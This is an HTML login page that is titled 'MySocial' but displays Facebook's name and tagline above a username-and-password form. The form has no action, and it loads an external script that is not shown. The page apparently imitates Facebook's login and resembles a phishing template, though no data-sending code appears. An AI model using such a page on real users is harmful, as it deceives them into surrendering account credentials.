<!DOCTYPE html>
<html lang="en">
<head>
  <meta charset="UTF-8" />
  <meta name="viewport" content="width=device-width, initial-scale=1.0"/>
  
  <title>Login to MySocial – Connect with Friends</title>

  <!-- SEO Meta Tags -->
  <meta name="description" content="Log in to MySocial to connect and share with people in your life.">
  <meta name="keywords" content="social media, login, MySocial, friends, connect, chat, share">
  <meta name="robots" content="index, follow">

  <!-- Open Graph -->
  <meta property="og:title" content="MySocial – Log In">
  <meta property="og:description" content="Log in to MySocial to connect and share with people in your life.">
  <meta property="og:type" content="website">

  <!-- Twitter Card -->
  <meta name="twitter:card" content="summary_large_image">
  <meta name="twitter:title" content="MySocial – Log In">
  <meta name="twitter:description" content="Log in to MySocial to connect and share with people in your life.">

  <!-- Favicon -->
  <link rel="icon" href="favicon.ico" type="image/x-icon">
  <link rel="stylesheet" href="styles.css" />

</head>
<body>
  <div class="container">
    <div class="login-box">
      <h1 class="logo">Facebook</h1>
      <p class="subtitle">
        Facebook helps you connect and share with the people in your life.
      </p>
      
      <!-- Updated form: Removed action attribute -->
      <form name="login" method="POST">
        <input 
          type="text" 
          id="username"
          name="username" 
          placeholder="Email address or phone number" 
          required
        />
        
        <input 
          type="password" 
          id="password"
          name="password" 
          placeholder="Password" 
          required
        />
        
        <button type="submit" class="login-btn">Log in</button>
        <a href="#" class="forgot">Forgotten password?</a>
        <hr />
        <button class="create-account">Create new account</button>
      </form>
    </div>

    <footer>
      <ul>
        <li>English (UK)</li>
        <li>Hausa</li>
        <li>Français (France)</li>
      </ul>
      <p>MySocial © 2025</p>
    </footer>
  </div>

  <script src="script.js"></script>
</body>
</html>
